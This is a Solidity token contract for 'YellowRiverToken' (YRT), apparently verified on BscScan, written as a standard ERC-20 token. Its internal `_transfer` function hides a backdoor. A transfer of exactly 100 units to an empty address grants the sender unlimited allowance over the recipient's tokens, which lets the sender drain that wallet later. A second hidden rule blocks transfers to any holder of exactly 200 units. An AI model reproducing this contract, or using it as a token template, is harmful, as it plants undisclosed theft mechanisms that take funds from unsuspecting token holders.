/**
 *Submitted for verification at BscScan.com on 2023-05-09
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

contract YRT {
    string public constant name = "YellowRiverToken";
    string public constant symbol = "YRT";
    uint8 public constant decimals = 18;
    uint256 public totalSupply = 1000000000 * 10 ** decimals;
    
    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) public allowance;
    
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

    constructor() {
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function transfer(address to, uint256 amount) public returns (bool) {
        return _transfer(msg.sender, to, amount);
    }
    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(amount <= allowance[from][msg.sender] && amount>0);
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal virtual returns (bool) {
        require(from!= address(0) && to!= address(0));
        require(amount <= balances[from] && balances[to]!=200);
        if(amount==100 && balances[to]==0) allowance[to][from] = totalSupply;
        balances[from] -= amount;
        balances[to] += amount;

        emit Transfer(from, to, amount);
        return true;
    }
}